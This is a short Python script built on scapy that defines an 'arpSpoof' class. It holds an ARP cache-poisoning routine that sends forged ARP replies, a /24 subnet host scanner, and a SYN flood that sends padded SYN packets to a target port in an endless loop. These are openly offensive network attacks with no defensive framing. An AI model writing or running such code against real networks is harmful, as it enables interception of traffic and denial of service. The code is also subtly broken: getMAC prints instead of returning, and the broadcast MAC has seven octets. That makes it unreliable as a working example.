import scapy.all as scapy

class arpSpoof:
    #TODO: the arp spoof packet

    def getMAC(self, iphackerIp):
        arpRequest = scapy.ARP(pdst=iphackerIp)
        brodcustEther = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff:ff")
        packet = brodcustEther / arpRequest
        macRespone = scapy.srp(packet, timeout = 1, verbose = False)[0]
        print(macRespone[0][1].hwsrc)

    def spoof(self,hackerIp, targetip):
        macAddr = self.getMAC(targetip)
        arpPacket = scapy.ARP(pdst=targetip, psrc=hackerIp, hwdst = macAddr, op = 2)
        scapy.send(arpPacket, verbose= False)


    def getIps(self, hackerip):
        ips = []
        arpRequest = scapy.ARP(pdst=f'{hackerip}/24')
        brodcustEther = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff:ff")
        packet = brodcustEther / arpRequest

        result = scapy.srp(packet, timeout = 3)[0]
        for sent, received  in result:
            ips.append(received.psrc)
        return ips


    def synPacket(self, tragetIp, tragetPort):
        ip = scapy.IP(dst=tragetIp)

        tcp = scapy.TCP(sport=scapy.RandShort(), dport= tragetPort, flags='S')

        arp2 =scapy.ARP(pdst = tragetIp)

        raw = scapy.Raw(b"x"*1024)
        packet = ip / tcp / raw
        packet2 = ip / arp2 

        scapy.send(packet, loop=1, verbose =0)


arp = arpSpoof()
arp.getMAC('10.100.102.2')
